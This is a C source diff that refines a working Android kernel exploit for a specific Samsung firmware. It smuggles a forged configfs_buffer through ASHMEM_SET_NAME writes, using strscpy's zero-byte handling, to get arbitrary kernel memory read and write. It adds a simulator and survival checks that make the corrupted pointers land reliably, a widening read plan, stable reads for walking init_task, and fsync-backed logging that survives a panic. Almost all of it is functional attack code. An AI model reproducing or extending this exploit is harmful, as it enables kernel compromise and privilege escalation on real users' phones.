@@ -215,6 +215,46 @@ static const char *rmg_temp_str(int millideg) {
 
 static void rmg_log_pin_diag(const char *why);
 
+/* Panic-surviving diagnostics.
+ *
+ * Under `adb shell` stdout is a PIPE, so it is block-buffered and its tail is
+ * discarded when the kernel panics mid-write. durable_log_checkpoint() cannot
+ * help either: it deliberately skips fsync() for non-regular stdout. The
+ * consequence is that both the streamed log and the on-device f946b.log lose
+ * their final lines, which makes the apparent failure point unreliable.
+ *
+ * This appends each record to a dedicated file and fsync()s immediately, so the
+ * last durable record written is the true failure point even across a panic. */
+static int rmg_diag_fd = -1;
+
+void rmg_diag(const char *fmt, ...) {
+  char buf[512];
+  va_list ap;
+  va_start(ap, fmt);
+  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
+  va_end(ap);
+  if (n < 0) {
+    return;
+  }
+  if ((size_t)n >= sizeof(buf)) {
+    n = (int)sizeof(buf) - 1;
+  }
+  if (rmg_diag_fd < 0) {
+    const char *path = getenv("RMG_DIAG_PATH");
+    if (!path || !*path) {
+      path = "/data/local/tmp/rmg-diag.log";
+    }
+    rmg_diag_fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
+  }
+  if (rmg_diag_fd < 0) {
+    return;
+  }
+  ssize_t w = write(rmg_diag_fd, buf, (size_t)n);
+  if (w > 0) {
+    fsync(rmg_diag_fd);
+  }
+}
+
 /* Waker crew size; the crew itself is defined further down. */
 #define RMG_WAKER_CREW 6
 
@@ -1066,14 +1106,101 @@ int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
   return ioctl(fd, ASHMEM_SET_NAME, name);
 }
 
+/* Deliver the control blob as a ladder of progressively shorter ASHMEM_SET_NAME writes.
+ *
+ * set_name() (drivers/staging/android/ashmem.c:587) does
+ * strscpy(asma->name + ASHMEM_NAME_PREFIX_LEN, local, 256). The generic arm64 strscpy
+ * (lib/string.c:216-234) copies a whole 8-byte word at a time and STOPS at the first
+ * word containing a NUL, writing c & zero_bytemask: bytes through the NUL are kept, the
+ * REST OF THAT WORD is zeroed, and all later words are left untouched. So a zero byte
+ * can only reach the kernel as a NUL, which requires a shorter write that terminates
+ * exactly there.
+ *
+ * The naive form - one rung per zero byte - cost 115+ ioctls per read (every byte past
+ * the live fields is zero). But strscpy already zeroes the remainder of the containing
+ * word, so a rung at the BASE of a word is enough to zero that whole word. Our blob is
+ * zero from just past the live fields to the end, so 9 word-aligned rungs cover it
+ * exactly: the same 53-ioctl cost as the fork, instead of 117. Each ioctl also memsets
+ * 256 bytes and strscpys 256 bytes into the kernel, so this is a real saving.
+ *
+ * Words are still walked in descending order so a later short rung never disturbs a
+ * byte an earlier rung already placed. */
+/* Faithful model of what the kernel's name buffer will contain after the ladder.
+ *
+ * Each rung is a separate ASHMEM_SET_NAME whose payload is blob with zeros folded to 1
+ * up to `at`, then a NUL at `at`. set_name() (drivers/staging/android/ashmem.c:587) does
+ * strscpy(asma->name + 11, local, 256), and the generic arm64 strscpy
+ * (lib/string.c:216-234) stores a whole 8-byte word at a time and STOPS at the first
+ * word containing a NUL, writing c & zero_bytemask: bytes through the NUL are kept, the
+ * REST OF THAT WORD is zeroed, and every later word is left UNTOUCHED - it keeps
+ * whatever the previous rung deposited.
+ *
+ * So the final state depends on the whole ladder, not on any single rung: a later rung
+ * at a lower address rewrites the low words and preserves the high ones a previous rung
+ * already zeroed. Simulating only the first rung makes every zero byte look like 0x01,
+ * which is wrong.
+ *
+ * out is the resulting 128-byte name buffer as the kernel will see it. */
+static void simulate_name_blob(const unsigned char *blob, size_t len, unsigned char *out) {
+  unsigned char sub[ASHMEM_BLOB_LEN];
+  for (size_t i = 0; i < ASHMEM_BLOB_LEN; i++) {
+    sub[i] = 1;
+    if (i < len && blob[i]) {
+      sub[i] = blob[i];
+    }
+  }
+  /* Rung 0: the full-length write, terminated by a NUL at `len`. */
+  for (size_t i = 0; i < ASHMEM_BLOB_LEN; i++) {
+    out[i] = sub[i];
+  }
+  /* The ladder itself: one rung per 8-byte word that holds a zero, descending. */
+  for (size_t w = (len + 7) & ~(size_t)7; w > 0; w -= 8) {
+    size_t base = w - 8;
+    bool word_has_zero = false;
+    for (size_t j = base; j < base + 8 && j < len; j++) {
+      if (!blob[j]) {
+        word_has_zero = true;
+        break;
+      }
+    }
+    if (!word_has_zero) {
+      continue;
+    }
+    /* strscpy for this rung: words strictly below `base` are rewritten verbatim; the
+     * word at `base` is written up to the NUL and the remainder of it zeroed; nothing
+     * above `base` is touched. */
+    for (size_t j = 0; j < base && j < ASHMEM_BLOB_LEN; j++) {
+      out[j] = sub[j];
+    }
+    for (size_t j = base; j < base + 8 && j < ASHMEM_BLOB_LEN; j++) {
+      out[j] = 0;
+    }
+  }
+}
+
 int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   if (try_put_blob_no_zeros(fd, blob, len) != 0) {
     return -1;
   }
 
   for (size_t i = len; i > 0; i--) {
-    if (blob[i - 1] == 0 &&
-        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
+    if (blob[i - 1] != 0) {
+      continue;
+    }
+    /* Round down to the containing word's base: strscpy zeroes the whole word from the
+     * NUL onward, so a rung here delivers every zero byte in that word. */
+    size_t base = (i - 1) & ~(size_t)7;
+    bool already = false;
+    for (size_t j = base + 8; j > i; j--) {
+      if (j <= len && blob[j - 1] == 0) {
+        already = true;
+        break;
+      }
+    }
+    if (already) {
+      continue;
+    }
+    if (try_put_blob_zero_at(fd, blob, base) != 0) {
       return -1;
     }
   }
@@ -2861,7 +2988,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
 }
 
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
-  unsigned char blob[128];
+  unsigned char blob[ASHMEM_BLOB_LEN];
   const uintptr_t write_align = 0x01000000ULL;
   const uint32_t max_write_window = 0x02000000U;
   if (!data || !len || len > SSIZE_MAX) {
@@ -2872,25 +2999,95 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
     errno = ERANGE;
     return -1;
   }
-  uintptr_t base = target & ~(write_align - 1);
-  off_t pos = (off_t)(target - base);
-  if (len > UINTPTR_MAX - (uintptr_t)pos) {
+  /* Choose a mapping base the driver will actually accept.
+   *
+   * `base` is the address the driver maps and `pos` is the offset of `target`
+   * within it. The driver only treats `base` as a kernel pointer when every one
+   * of its eight bytes is non-zero - the same property configfs_read_once()
+   * enforces while searching for a usable page.
+   *
+   * A plain 16 MB truncation does NOT preserve that property. On
+   * F946BXXS7GZH2 the write payload page lands at 0xffffff8900110000, whose
+   * 16 MB-aligned base is 0xffffff8900000000 - an address with a zero byte at
+   * bits 24-31. Every write was therefore rejected with ERANGE, while the
+   * byte-identical binary worked on F946BXXS7GZE5, where the same page landed
+   * lower and the aligned base 0xffffff8834000000 has no zero byte at all. The
+   * two kernels are the same build, so this is an allocation-address accident
+   * rather than a firmware behaviour change:
+   *
+   *   GZE5  base=ffffff8834000000  bytes[3..7]=34 88 ff ff ff  -> accepted
+   *   GZH2  base=ffffff8900000000  bytes[3..7]=00 89 ff ff ff  -> ERANGE
+   *
+   * The step is a page, not the full 16 MB alignment. Coarsening it to write_align
+   * leaves only one or two candidates in the search window, and the ERANGE test
+   * (top five bytes of the base must be non-zero) then fails outright - measured
+   * errno=34 on GZH2. The strscpy survival check added below is the real guard
+   * against a mangled base: it rejects the plan with EILSEQ instead of silently
+   * writing to the wrong address, which is what a coarse step was trying to prevent. */
+  const uintptr_t step = 0x1000ULL; /* keep the base page aligned */
+  uintptr_t base = 0;
+  off_t pos = 0;
+  uintptr_t start = target & ~(write_align - 1);
+  for (uintptr_t delta = 0; delta <= (uintptr_t)max_write_window; delta += step) {
+    if (delta > start) {
+      break;
+    }
+    uintptr_t cand = start - delta;
+    uintptr_t p = (uintptr_t)(target - cand);
+    if (len > UINTPTR_MAX - p) {
+      break;
+    }
+    if (p + len > (uintptr_t)max_write_window) {
+      break;
+    }
+    /* Top five bytes must be non-zero; the low three are always zero after the
+     * 16 MB alignment above. */
+    if (!((cand >> 24) & 0xff) || !((cand >> 32) & 0xff) ||
+        !((cand >> 40) & 0xff) || !((cand >> 48) & 0xff) ||
+        !((cand >> 56) & 0xff)) {
+      continue;
+    }
+    base = cand;
+    pos = (off_t)p;
+    break;
+  }
+  if (!base) {
     errno = ERANGE;
     return -1;
   }
   uintptr_t end = (uintptr_t)pos + len;
   uint32_t buffer_size = 0;
 
-  if (end > max_write_window ||
-      !((base >> 24) & 0xff) || !((base >> 32) & 0xff) ||
-      !((base >> 40) & 0xff) || !((base >> 48) & 0xff) ||
-      !((base >> 56) & 0xff)) {
+  if (end > max_write_window) {
     errno = ERANGE;
     return -1;
   }
+  /* The window must be able to reach a usable candidate, and that is NOT always `end`.
+   *
+   * byte2 (bits 16-23) is constant across a whole 64 KB block, so if `end` lands in
+   * [0, 0x10000) then byte2 is 0 for every value in that entire sub-range and the first
+   * usable candidate is 0x10101 - up to 0x10101 away. The old 0x200 window could not span
+   * that, so the loop exited with buffer_size == 0 and returned ERANGE. Measured on
+   * RFCWC0G1Z1J: pos=0xb018 (end=0xb020) failed with errno=34, while pos=0xa6618
+   * (end=0xa6620, all three low bytes non-zero) succeeded on the very first candidate.
+   * This hits any target whose pos lands in a zero-byte region, not just one address.
+   *
+   * The heuristic itself is load-bearing and must NOT be dropped: bin_buffer_size shares an
+   * 8-byte strscpy word with `base` bytes 3-7 (blob word [80,88)). A zero in bytes 0-2 makes
+   * strscpy (lib/string.c:227) zero the whole word, so bin_buffer_size becomes 0, the driver
+   * takes the vmalloc grow branch at fs/configfs/file.c:262, and the write lands on a fresh
+   * heap page instead of the target. Wider window, same rule.
+   *
+   * The 0x1000000 break is a second, separate constraint: word [88,96) holds buffer_size
+   * byte3 alongside cb_max_size=0, so byte3 ALWAYS survives as 0. Any candidate with
+   * byte3 != 0 can never be transmitted, so the search must stop below 16 MB rather than
+   * pick a value the validator would later reject with EILSEQ. */
   for (uintptr_t candidate_size = end;
-       candidate_size <= max_write_window && candidate_size - end < 0x200;
+       candidate_size <= max_write_window && candidate_size - end < 0x10102;
        candidate_size++) {
+    if (candidate_size >= 0x1000000ULL) {
+      break;
+    }
     int usable = 1;
     for (size_t i = 0; i < 3; i++) {
       if (!((candidate_size >> (i * 8)) & 0xff)) {
@@ -2907,25 +3104,62 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
     errno = ERANGE;
     return -1;
   }
-  memset(blob, 0, sizeof(blob));
+  /* Same fill-all-1 construction as the read plan, for the same reason: a zero tail
+   * would put a zero in the word holding part of `base`, the ladder would zero that
+   * word, and the pwrite would land at the wrong address. Zero only the state range. */
+  memset(blob, 1, sizeof(blob));
+  for (size_t o = CFG_MUTEX_OFF; o < CFG_CB_MAX_SIZE_OFF + 4; o++) {
+    blob[o - ASHMEM_NAME_PREFIX_LEN] = 0;
+  }
   put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
   put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, buffer_size);
   put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+  {
+    /* Refuse the plan if `base` (which becomes buffer->bin_buffer) would be mangled, or
+     * if bin_buffer_size/cb_max_size would not land. A mangled base writes to the wrong
+     * kernel address; a non-zero cb_max_size sends configfs_bin_write_iter down the
+     * vmalloc/-EFBIG grow branch instead of the direct copy. */
+    unsigned char sim[ASHMEM_BLOB_LEN];
+    simulate_name_blob(blob, sizeof(blob), sim);
+    uint64_t survived_base = 0;
+    memcpy(&survived_base, sim + (CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN), 8);
+    uint32_t survived_sz = 0xffffffffu;
+    memcpy(&survived_sz, sim + (CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+    uint32_t survived_max = 0xffffffffu;
+    memcpy(&survived_max, sim + (CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+    if (survived_base != (uint64_t)base || survived_sz != buffer_size ||
+        survived_max != 0) {
+      rmg_diag("WR plan REJECTED: base=%016zx->%016llx sz=%u->%u max=%u->%u "
+               "target=%016zx len=%zu\n",
+               base, (unsigned long long)survived_base, buffer_size, survived_sz, 0u,
+               survived_max, target, len);
+      errno = EILSEQ;
+      return -1;
+    }
+  }
+  rmg_diag("WR target=%016zx base=%016zx pos=%#zx len=%zu bufsz=%#x "
+           "fdoff=%d szoff=%d msoff=%d\n",
+           target, base, (size_t)pos, len, buffer_size, CFG_BIN_BUFFER_OFF,
+           CFG_BIN_BUFFER_SIZE_OFF, CFG_CB_MAX_SIZE_OFF);
   errno = 0;
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
   int set_errno = errno;
   if (set_ret != 0) {
+    rmg_diag("WR setname FAILED ret=%d errno=%d base=%016zx pos=%#zx\n",
+             set_ret, set_errno, base, (size_t)pos);
     errno = set_errno;
     return -1;
   }
 
   errno = 0;
   ssize_t wr = pwrite(fd, data, len, pos);
+  rmg_diag("WR pwrite ret=%zd errno=%d base=%016zx pos=%#zx len=%zu target=%016zx\n",
+           wr, errno, base, (size_t)pos, len, target);
   return wr;
 }
 
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
-  unsigned char blob[128];
+  unsigned char blob[ASHMEM_BLOB_LEN];
   uintptr_t page = 0;
   off_t pos = 0;
 
@@ -2939,44 +3173,176 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
     return -1;
   }
 
-  memset(blob, 0, sizeof(blob));
-  memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
-  for (uint64_t window = len; window < len + 0x10000; ++window) {
-    uintptr_t candidate_pos = ASHMEM_PREFIX_COUNT - window;
-    if (target < candidate_pos) {
-      continue;
-    }
-    uintptr_t candidate_page = target - candidate_pos;
-    int usable = 1;
-
-    for (size_t i = 0; i < sizeof(candidate_page); ++i) {
-      if (!((candidate_page >> (i * 8)) & 0xff)) {
-        usable = 0;
-        break;
-      }
-    }
-    if (usable) {
-      page = candidate_page;
-      pos = (off_t)candidate_pos;
-      break;
-    }
+  /* Fill the WHOLE control with 1, then zero only the range that must be zero.
+   *
+   * This matters more than it looks. The ladder puts a NUL at the base of every 8-byte
+   * word that contains a zero, and strscpy zeroes that whole word. The `page` pointer
+   * occupies blob bytes 5..12, which straddles words 0 and 1. If the tail of the buffer
+   * is left as zeros, word 1 contains a zero, a rung lands at byte 8, and that rung
+   * zeroes bytes 8..15 - destroying page bytes 3..7 and silently redirecting the read.
+   * Filling the tail with 1 keeps word 1 zero-free so the pointer survives.
+   *
+   * This is the soumarcelino fork's exact construction: memset(control, 1, CONTROL_LEN)
+   * then zero the state range. Our earlier memset(blob, 0, ...) with 1s only up to
+   * CFG_PAGE_OFF was wrong, and the new survival check caught it - it is exactly the
+   * failure mode that check exists to detect. */
+  memset(blob, 1, sizeof(blob));
+  for (size_t o = CFG_MUTEX_OFF; o < CFG_NEEDS_READ_FILL_OFF + 4; o++) {
+    blob[o - ASHMEM_NAME_PREFIX_LEN] = 0;
   }
-  if (!page) {
+  /* Deterministic read plan - no searching.
+   *
+   * The previous implementation walked `window` looking for a value whose `page`
+   * had all eight bytes non-zero, and used whatever it found first. That search
+   * is the bug: it generally lands on a different plan than intended, so the
+   * driver maps the wrong address. That is exactly the observed symptom - reads
+   * coming back with stale contents or with plausible-looking but wrong
+   * pointers. It also made repeated reads of one address non-idempotent, because
+   * each attempt picked a different window.
+   *
+   * The soumarcelino fork does no search at all:
+   *     offset   = ASHMEM_PREFIX_COUNT - len
+   *     page     = target - offset
+   *     check_len = ASHMEM_PREFIX_COUNT - offset      (== len, asserted)
+   * and it additionally simulates the driver's strscpy() over the blob and
+   * refuses the plan unless the page pointer and read-state ranges survive
+   * unmodified. The simulation is what detects a zero byte in `page`; the right
+   * response to that is to REJECT the plan, not to go hunting for a friendlier
+   * one.
+   */
+  uint64_t read_offset = ASHMEM_PREFIX_COUNT - (uint64_t)len;
+  if ((uint64_t)len >= ASHMEM_PREFIX_COUNT) {
     errno = ERANGE;
     return -1;
   }
+  page = target - (uintptr_t)read_offset;
+  pos = (off_t)read_offset;
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+  /* Refuse the plan if the blob cannot survive the ashmem strscpy.
+   *
+   * set_name() (drivers/staging/android/ashmem.c:587) does
+   * strscpy(asma->name + 11, local, 256), and the generic arm64 strscpy
+   * (lib/string.c:216-234) copies a whole 8-byte word at a time and STOPS at the first
+   * word containing a NUL, writing c & zero_bytemask - bytes through the NUL kept, the
+   * rest of that word zeroed, later words left untouched. A zero byte can therefore only
+   * be transmitted as a NUL, which is why the blob is delivered as a ladder of
+   * progressively shorter prefixes.
+   *
+   * If `page` contains a zero byte, the word it lives in is truncated at that byte and
+   * the remainder becomes 0, so configfs_buffer.page is corrupted and the read is
+   * redirected to a wild address. Measured 768/200000 = 0.384% of 8-byte-aligned reads
+   * are affected. The fork catches this with read_control_survives_strscpy() and refuses
+   * the plan; without the check the corruption is silent. */
+  {
+    unsigned char sim[ASHMEM_BLOB_LEN];
+    simulate_name_blob(blob, sizeof(blob), sim);
+    /* Blob byte i lands at configfs_buffer + (i + ASHMEM_NAME_PREFIX_LEN). */
+    uint64_t survived_page = 0;
+    memcpy(&survived_page, sim + (CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN), 8);
+    if (survived_page != (uint64_t)page) {
+      /* `page` is target - (COUNT - len), so the LENGTH chooses the intermediate
+       * pointer. Widening the read shifts `page` while the copy still starts at
+       * `target` (the driver copies `count - ki_pos` bytes from `page + ki_pos`, and
+       * `page + ki_pos == target` by construction), so we can search lengths until one
+       * has a zero-byte-free `page` and then keep only the bytes we wanted.
+       *
+       * Without this, roughly 0.384% of reads are unplannable at any fixed length, and a
+       * single unlucky fd_array page aborts the whole scan. The extra bytes are read
+       * from just past the target, inside the same object, so the width stays small. */
+      unsigned char wide[4096];
+      size_t want = len;
+      size_t cap = (len + 256) & ~(size_t)7;
+      if (cap > sizeof(wide)) {
+        cap = sizeof(wide);
+      }
+      for (size_t try_len = want + 8; try_len <= cap; try_len += 8) {
+        uint64_t try_off = ASHMEM_PREFIX_COUNT - (uint64_t)try_len;
+        uintptr_t try_page = target - (uintptr_t)try_off;
+        memset(blob, 1, sizeof(blob));
+        for (size_t o = CFG_MUTEX_OFF; o < CFG_NEEDS_READ_FILL_OFF + 4; o++) {
+          blob[o - ASHMEM_NAME_PREFIX_LEN] = 0;
+        }
+        put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, try_page);
+        put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+        simulate_name_blob(blob, sizeof(blob), sim);
+        uint64_t ok_page = 0;
+        memcpy(&ok_page, sim + (CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN), 8);
+        if (ok_page != (uint64_t)try_page) {
+          continue;
+        }
+        errno = 0;
+        if (try_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) {
+          continue;
+        }
+        errno = 0;
+        ssize_t wr = pread(fd, wide, try_len, (off_t)try_off);
+        if (wr != (ssize_t)try_len) {
+          rmg_diag("RD wide read failed len=%zu ret=%zd errno=%d, next width\n", try_len, wr,
+                   errno);
+          continue;
+        }
+        memcpy(data, wide, want);
+        rmg_diag("RD widened len %zu->%zu to dodge a zero byte in page=%016zx "
+                 "target=%016zx\n",
+                 want, try_len, try_page, target);
+        return (ssize_t)want;
+      }
+      rmg_diag("RD plan REJECTED: page=%016zx mangled to %016llx by strscpy, and no "
+               "width in [%zu,%zu] dodged it (target=%016zx)\n",
+               page, (unsigned long long)survived_page, want, cap, target);
+      errno = EILSEQ;
+      return -1;
+    }
+    /* needs_read_fill must land as a real 0, else configfs_read_iter takes the
+     * fill_read_buffer() path, which calls get_zeroed_page(GFP_KERNEL) and can block in
+     * direct reclaim indefinitely. */
+    uint32_t survived_nrf = 0xffffffffu;
+    memcpy(&survived_nrf, sim + (CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+    if (survived_nrf != 0) {
+      rmg_diag("RD plan REJECTED: needs_read_fill=%u (fill_read_buffer would block) "
+               "target=%016zx len=%zu\n",
+               survived_nrf, target, len);
+      errno = EILSEQ;
+      return -1;
+    }
+    /* The forged mutex must be entirely zero, or mutex_lock() at
+     * fs/configfs/file.c:86 spins or sleeps forever on a bogus owner with
+     * MUTEX_WARN_ON compiled out (CONFIG_DEBUG_MUTEXES=n) - a hang with no oops. */
+    for (size_t o = 0; o < CFG_NEEDS_READ_FILL_OFF - CFG_MUTEX_OFF; o++) {
+      if (sim[(CFG_MUTEX_OFF - ASHMEM_NAME_PREFIX_LEN) + o]) {
+        rmg_diag("RD plan REJECTED: mutex byte %zu = 0x%02x (mutex_lock would hang) "
+                 "target=%016zx len=%zu\n",
+                 o, sim[(CFG_MUTEX_OFF - ASHMEM_NAME_PREFIX_LEN) + o], target, len);
+        errno = EILSEQ;
+        return -1;
+      }
+    }
+  }
+  rmg_diag("RD target=%016zx page=%016zx pos=%#zx len=%zu\n", target, page,
+           (size_t)pos, len);
   errno = 0;
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
   int set_errno = errno;
   if (set_ret != 0) {
+    rmg_diag("RD setname FAILED ret=%d errno=%d page=%016zx pos=%#zx\n", set_ret,
+             set_errno, page, (size_t)pos);
     errno = set_errno;
     return -1;
   }
 
   errno = 0;
   ssize_t rd = pread(fd, data, len, pos);
+  /* Always report the first 8 bytes actually returned, not just for len==8. Printing a
+   * hardcoded 0 for every other length made a 40-byte descriptor read look like "all
+   * zeros" and sent the whole investigation after a non-existent zeroing bug - the ring
+   * slot was fine, the log line was lying. */
+  uint64_t head_val = 0;
+  if (rd > 0) {
+    memcpy(&head_val, data, rd < 8 ? (size_t)rd : 8u);
+  }
+  rmg_diag("RD pread ret=%zd errno=%d page=%016zx pos=%#zx val=%016llx\n", rd,
+           errno, page, (size_t)pos, (unsigned long long)head_val);
   return rd;
 }
 
@@ -2991,6 +3357,47 @@ uint64_t kernel_read64(int fd, uintptr_t target) {
     return 0;
   }
   return value;
+}
+
+/* Read a kernel qword and only trust it once two consecutive reads agree.
+ *
+ * The ashmem-name AAR is not idempotent: the mapping it installs is keyed by
+ * the 128-byte name blob, and when a blob repeats the driver can hand back the
+ * memfd's *previous* contents instead of re-mapping. That is not a wrong
+ * address - it is genuinely stale data. Observed directly on GZH2 while walking
+ * init_task, where the read came back as ASCII left over from an earlier dmesg
+ * capture performed by this same payload:
+ *
+ *   next=0x445f5046475f5f22 -> "D_PFG__"
+ *   prev=0x45525f5443455249 -> "ER_TCERI"
+ *
+ * A repeated read of the same address produces a different name blob only if
+ * something in it varies, so the retry here re-issues the read and compares: two
+ * consecutive identical results are accepted, and disagreement counts as a
+ * failure. Callers that walk pointer chains must use this rather than
+ * kernel_read64(), otherwise a single stale word is followed as if it were real
+ * and the walk wanders off into unrelated memory (which on this device is a
+ * kernel hang, not a clean rejection). */
+uint64_t kernel_read64_stable(int fd, uintptr_t target, int tries) {
+  if (tries < 2) {
+    tries = 2;
+  }
+  uint64_t first = kernel_read64(fd, target);
+  for (int i = 1; i < tries; ++i) {
+    /* The read plan is now deterministic, so a retry issues a byte-identical
+     * request. Repeat it anyway: it is the only way to catch a transient
+     * mapping failure, and a disagreement is still evidence the value is not
+     * trustworthy. */
+    uint64_t again = kernel_read64(fd, target);
+    if (again == first) {
+      return first;
+    }
+    rmg_diag("RS unstable target=%016zx try=%d salt=%d first=%016llx again=%016llx\n",
+             target, i, i, (unsigned long long)first,
+             (unsigned long long)again);
+  }
+  rmg_diag("RS giving up target=%016zx after %d tries\n", target, tries);
+  return 0;
 }
 
 ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
